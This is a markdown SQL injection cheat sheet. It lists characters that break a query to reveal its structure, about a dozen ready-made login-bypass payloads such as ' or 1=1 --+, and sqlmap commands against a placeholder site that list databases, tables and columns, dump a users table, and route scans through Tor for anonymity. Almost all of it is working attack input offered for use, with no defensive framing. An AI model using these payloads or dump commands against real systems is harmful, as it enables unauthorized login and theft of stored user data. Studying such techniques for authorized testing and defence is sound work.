# SQL INJECTIONS CHEAT SHEET

- Detection
    
    First thing to test for an SQL injection is to try to break the query, with the intention of getting the syntax of how SQL is getting input at the backend. This technique works in UNION/Error based SQL Injections, where we force the backend database to throw an error.
    
    Using this technique, we can somehow determine the backend query structure to efficiently exploit SQL Injection. Query can be broken by throwing various characters as input like :
    
    - `‘`
    - `“`
    - `‘)`
    - `‘))`
    - `“))`
    - `/`
    - `;`
    - `//`
    - `\`
    - `- -`
- Login Bypassing
    
    ### Login screens and forms containing SQL vulnerabilities can be bypassed using various SQLi.
    
    - `admin’ #`
    - `admin” #`
    - `admin’)) #`
    - `‘ or 1=1 --+`
    - `‘ or 1=1 #`
    - `" or " " "`
    - `" or true --`
    - `" or true --+`
    - `‘)) or true -- -`
    - `admin' or 1=1 or ''='`
    - `admin') or ('1'='1'--`
    - `admin') or '1'='1'/*`
    - `admin") or "1"="1`
    - `') or ('1'='1 --`
- SQLPMAP
    
    Easy Scanning option
    
    `sqlmap -u "http://testsite.com/login.php"`
    
    Scanning by using tor
    
    `sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5`
    
    Scanning by manually setting the return time
    
    `sqlmap -u "http://testsite.com/login.php" --time-sec 15`
    
    List all databases at the site
    
    `sqlmap -u "http://testsite.com/login.php" --dbs`
    
    List all tables in a specific database
    
    `sqlmap -u "http://testsite.com/login.php" -D site_db --tables`
    
    Dump the contents of a DB table
    
    `sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump`
    
    List all columns in a table
    
    `sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns`
    
-